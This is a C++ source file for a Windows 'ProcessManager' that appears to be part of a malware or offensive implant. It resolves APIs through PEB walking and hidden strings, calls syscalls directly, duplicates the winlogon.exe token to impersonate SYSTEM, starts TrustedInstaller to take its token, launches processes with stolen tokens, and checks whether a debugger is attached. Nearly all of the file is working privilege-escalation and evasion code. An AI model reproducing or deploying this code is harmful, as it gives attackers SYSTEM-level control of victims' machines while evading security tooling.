#include "procmgr.h"

std::string _lower(std::string inp) {
	std::string out = "";
	for ( auto& c : inp )
		out += tolower(c);
	return out;
}

// return true if they are equal
// return false if otherwise
BOOL _sub(std::string libPath, std::string s2) {
	return libPath.find(s2) != std::string::npos;
}

std::string PWSTRToString(PWSTR inp) {
	return std::string(_bstr_t(inp));
}

FARPROC ProcessManager::GetFunctionAddressInternal(HMODULE lib, std::string procedure) {
	// get nt and dos headers
	PIMAGE_DOS_HEADER       dosHeader = ( PIMAGE_DOS_HEADER ) lib;
	PIMAGE_NT_HEADERS       ntHeader = ( PIMAGE_NT_HEADERS ) ( dosHeader->e_lfanew + ( BYTE* ) lib );
	IMAGE_OPTIONAL_HEADER   optHeader = ntHeader->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY exports = ( PIMAGE_EXPORT_DIRECTORY ) ( ( BYTE* ) lib + optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

	// Addresses
	DWORD* functionAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfFunctions );
	DWORD* funcNameAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfNames );
	WORD* funcNameOrdinals = ( WORD* ) ( ( BYTE* ) lib + exports->AddressOfNameOrdinals );

	for ( DWORD funcIndex = 0; funcIndex < exports->NumberOfNames; funcIndex++ ) {
		const char* funcName = ( const char* ) ( BYTE* ) lib + funcNameAddresses[funcIndex];
		if ( strcmp(funcName, procedure.c_str()) == 0 ) {
			DWORD funcID = funcNameOrdinals[funcIndex];
			DWORD address = functionAddresses[funcID];
			BYTE* absoluteAddress = ( ( BYTE* ) lib + address );

			return ( FARPROC ) absoluteAddress;
		}
	}
	return NULL;
}

HMODULE ProcessManager::GetLoadedModule(std::string libName)
{
	if ( this->m_LoadedDLLs.count(_lower(libName).c_str()) > 0 )
		return this->m_LoadedDLLs.find(_lower(libName).c_str())->second;

	PPEB peb = ( PPEB ) GetPebAddress();

	PPEB_LDR_DATA         LDRData   = peb->Ldr;
	LIST_ENTRY*           modules   = &LDRData->InMemoryOrderModuleList;
	LIST_ENTRY*           nextEntry = modules->Flink;
	LDR_DATA_TABLE_ENTRY* modInfo   = NULL;

	while ( nextEntry != modules ) {
		modInfo = ( LDR_DATA_TABLE_ENTRY* ) ( ( BYTE* ) nextEntry - sizeof(LIST_ENTRY) ); // get the info
		nextEntry = nextEntry->Flink; // set the current node to the next node

		if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {
			HMODULE mod = ( HMODULE ) modInfo->DllBase;
			this->m_LoadedDLLs.insert(std::pair<const char*, HMODULE>(_lower(libName).c_str(), mod));

			return mod;
		}
	}

	return NULL;
}

HMODULE ProcessManager::GetLoadedLib(std::string libName) {
	if ( this->m_LoadedDLLs.count(_lower(libName)) > 0 ) {
		return this->m_LoadedDLLs.at(_lower(libName));
	}

	return GetLoadedModule(libName);
}

BOOL ProcessManager::FreeUsedLibrary(std::string lib) {
	if ( this->m_LoadedDLLs.find(_lower(lib).c_str()) == this->m_LoadedDLLs.end() )
		return FALSE;

	HMODULE module = this->m_LoadedDLLs.find(_lower(lib).c_str())->second;

	if ( !Call<_FreeDLL>(GetLoadedLib((char*)HIDE("kernel32.dll")), std::string(HIDE("FreeLibraryA")), module) )
		return FALSE;

	this->m_LoadedDLLs.erase(_lower(lib).c_str());

	return TRUE;
}

ProcessManager::ProcessManager() {
	// load required mods
	if ( DllsLoaded )
		return;

	Kernel32DLL = this->GetLoadedModule((char*)HIDE("kernel32.dll"));
	AdvApi32DLL = this->GetLoadedModule((char*)HIDE("advapi32.dll"));
	NTDLL       = this->GetLoadedModule((char*)HIDE("ntdll.dll"));

	if ( Kernel32DLL == NULL || AdvApi32DLL == NULL || NTDLL == NULL )
		return;

	DllsLoaded = TRUE;

	this->LoadAllNatives();
	OutputDebugStringA("loaded process manager");
}

template <typename type>
void ProcessManager::LoadNative(char* name, HMODULE from) {
	type loaded = GetFunctionAddress<type>(from, name);
	if ( !loaded ) {
		std::string d = "error getting " + std::string(name) + " func address\n";
		OutputDebugStringA(d.c_str());
		return;
	}

	FunctionPointer<type> fp = {};
	fp.from = from; 
	fp.call = loaded;
	fp.name = name;

	this->m_Natives[name] = std::any(fp);
	std::string d = "inserted " + std::string(name) + "\n";
	OutputDebugStringA(d.c_str());
}

void ProcessManager::SetThisContext(SecurityContext newContext) {
	if ( newContext > this->m_Context )
		this->m_Context = newContext;
}

void ProcessManager::LoadAllNatives() {
	if ( this->m_NativesLoaded )
		return;

	LoadNative<::_GetComputerNameA>((char*)HIDE("GetComputerNameA"), Kernel32DLL);
	LoadNative<::_ImpersonateLoggedOnUser>((char*)HIDE("ImpersonateLoggedOnUser"), AdvApi32DLL);
	LoadNative<::_CreateToolhelp32Snapshot>((char*)HIDE("CreateToolhelp32Snapshot"), Kernel32DLL);
	LoadNative<::_OpenServiceA>((char*)HIDE("OpenServiceA"), AdvApi32DLL);
	LoadNative<::_OpenSCManagerW>((char*)HIDE("OpenSCManagerW"), AdvApi32DLL);
	LoadNative<::_QueryServiceStatusEx>((char*)HIDE("QueryServiceStatusEx"), AdvApi32DLL);
	LoadNative<::_StartService>((char*)HIDE("StartServiceW"), AdvApi32DLL);
	LoadNative<::_CreateProcessWithTokenW>((char*)HIDE("CreateProcessWithTokenW"), AdvApi32DLL);
	LoadNative<::_Process32NextW>((char*)HIDE("Process32NextW"), Kernel32DLL);
	LoadNative<::_Process32FirstW>((char*)HIDE("Process32FirstW"), Kernel32DLL);
	LoadNative<::_LoadLibrary>((char*)HIDE("LoadLibraryA"), Kernel32DLL);
	this->m_NativesLoaded = TRUE;
}

ProcessManager::~ProcessManager() {
	for ( auto& libInfo : this->m_LoadedDLLs )
		if ( strcmp(_lower(libInfo.first).c_str(), (char*)HIDE("kernel32.dll")) != 0)
			FreeUsedLibrary(libInfo.first.c_str());
}

DWORD ProcessManager::PIDFromName(const char* name) {
	// take snapshot of all current running processes

	PROCESSENTRY32 processEntry;
	DWORD          processID = -1;
	HANDLE         processSnapshot = GetNative<::_CreateToolhelp32Snapshot>((char*) HIDE("CreateToolhelp32Snapshot")).call(TH32CS_SNAPPROCESS, 0);

	OutputDebugStringA("process");

	if ( processSnapshot == INVALID_HANDLE_VALUE ) {
		return -1;
	}

	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// process the first file in the snapshot, put information in processEntry
	if ( !GetNative<_Process32FirstW>((char*)HIDE("Process32FirstW")).call( processSnapshot, &processEntry ) ) {
		SysNtClose(processSnapshot);
		return -1;
	}

	// iterate through all running processes
	// compare the proc name to the name of the process we need
	// if they're the same, return the process id and return
	do {
		if ( strcmp(name, _bstr_t(processEntry.szExeFile)) == 0 ) {
			processID = processEntry.th32ProcessID;
			break;
		}
	} while ( GetNative<_Process32NextW>((char*)HIDE("Process32NextW")).call( processSnapshot, &processEntry ) ); // iterate if the next process in the snapshot is valid

	SysNtClose(processSnapshot);

	return processID;
}

HANDLE ProcessManager::CreateProcessAccessToken(DWORD processID) {
	OBJECT_ATTRIBUTES objectAttributes{};
	HANDLE            process = NULL;
	CLIENT_ID         pInfo{};
	pInfo.UniqueProcess = ( HANDLE ) processID;
	pInfo.UniqueThread = ( HANDLE ) 0;

	InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);

	NTSTATUS openStatus = SysNtOpenProcess(
		&process,
		MAXIMUM_ALLOWED,
		&objectAttributes,
		&pInfo
	);

	if ( openStatus != STATUS_SUCCESS ) {
		return NULL;
	}

	HANDLE   processToken = NULL;
	NTSTATUS openProcTokenStatus = SysNtOpenProcessTokenEx(process, TOKEN_DUPLICATE, 0, &processToken);

	if ( openProcTokenStatus != STATUS_SUCCESS ) {
		SysNtClose(process);
		return NULL;
	}

	InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);
	HANDLE   duplicatedToken = NULL;
	NTSTATUS tokenDuplicated = SysNtDuplicateToken(
		processToken,
		MAXIMUM_ALLOWED,
		&objectAttributes,
		FALSE,
		TokenPrimary,
		&duplicatedToken
	);

	if ( tokenDuplicated != STATUS_SUCCESS ) {
		SysNtClose(processToken);
		SysNtClose(process);
		return NULL;
	}

	SysNtClose(process);
	SysNtClose(processToken);

	return duplicatedToken;
}

BOOL ProcessManager::OpenProcessAsImposter(
	HANDLE token,
	DWORD dwLogonFlags,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
) {

	return GetNative<_CreateProcessWithTokenW>((char*) HIDE("CreateProcessWithTokenW")).call(
		token,
		dwLogonFlags,
		lpApplicationName,
		lpCommandLine,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation
	);
}

DWORD ProcessManager::StartWindowsService(std::string serviceName) {
	SC_HANDLE scManager = GetNative<_OpenSCManagerW>((char*)HIDE("OpenSCManagerW")).call( nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE );
	if ( scManager == NULL )
		return -1;

	SC_HANDLE service = GetNative<_OpenServiceA>((char*)HIDE("OpenServiceA")).call( scManager, serviceName.c_str(), GENERIC_READ | GENERIC_EXECUTE );
	if ( service == NULL ) {
		SysNtClose(scManager);
		return -1;
	}

	SERVICE_STATUS_PROCESS status = { 0 };
	DWORD statusBytesNeeded;

	// query and attempt to start, wait if stop pending, until service running
	do {
		// query the service status
		if ( !GetNative<_QueryServiceStatusEx>((char*)HIDE("QueryServiceStatusEx")).call(
			service,
			SC_STATUS_PROCESS_INFO,
			( LPBYTE ) &status,
			sizeof(SERVICE_STATUS_PROCESS),
			&statusBytesNeeded
		) ) {
			SysNtClose(scManager);
			SysNtClose(service);
			return -1;
		}

		// check if stop pending
		if ( status.dwCurrentState == SERVICE_STOP_PENDING || status.dwCurrentState == SERVICE_START_PENDING ) {
			// wait until service is stopped 

			// recommended wait time based on microsoft win32 docs
			int wait = status.dwWaitHint / 10;

			if ( wait < 1000 )
				wait = 1000;
			else if ( wait > 10000 )
				wait = 10000;
			Sleep(wait);
			continue;
		}

		// service is not running
		if ( status.dwCurrentState == SERVICE_STOPPED ) {
			BOOL serviceStarted = GetNative<_StartService>((char*)HIDE("StartServiceW")).call( service, 0, NULL );
			if ( !serviceStarted ) {
				SysNtClose(service);
				SysNtClose(scManager);
				return -1;
			}
		}
	} while ( status.dwCurrentState != SERVICE_RUNNING );

	// service is now started
	SysNtClose(service);
	SysNtClose(scManager);

	return status.dwProcessId;
}

HANDLE ProcessManager::ImpersonateWithToken(HANDLE token) {
	if ( !GetNative<_ImpersonateLoggedOnUser>((char*)HIDE("ImpersonateLoggedOnUser")).call( token ) ) {
		SysNtClose(token);
		return NULL;
	}

	return token;
}

HANDLE ProcessManager::GetSystemToken() {
	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));
	if ( logonPID == 0 ) // bad process id
		return FALSE;
	
	//SandboxCompromise::DelayOperation();
	HANDLE winlogon = CreateProcessAccessToken(logonPID);
	if ( winlogon == NULL )
		return NULL;

	HANDLE impersonate = ImpersonateWithToken(winlogon);
	if ( impersonate == NULL )
		return NULL;

	SetThisContext(SecurityContext::System);
	return impersonate;
}

HANDLE ProcessManager::GetTrustedInstallerToken() {
	DWORD  pid   = StartWindowsService(std::string(HIDE("TrustedInstaller")));
	HANDLE token = CreateProcessAccessToken(pid);
	if ( token == NULL )
		return NULL;

	HANDLE impersonate = ImpersonateWithToken(token);
	if ( impersonate == NULL )
		return NULL;

	SetThisContext(SecurityContext::TrustedInstaller);
	return impersonate;
}


BOOL ProcessManager::CheckNoDebugger() {
	PPEB filePEB = ( PPEB ) GetPebAddress();
	BYTE beingDebugged = filePEB->BeingDebugged;

	if ( beingDebugged ) {
		return TRUE;
	}

	return FALSE;
}
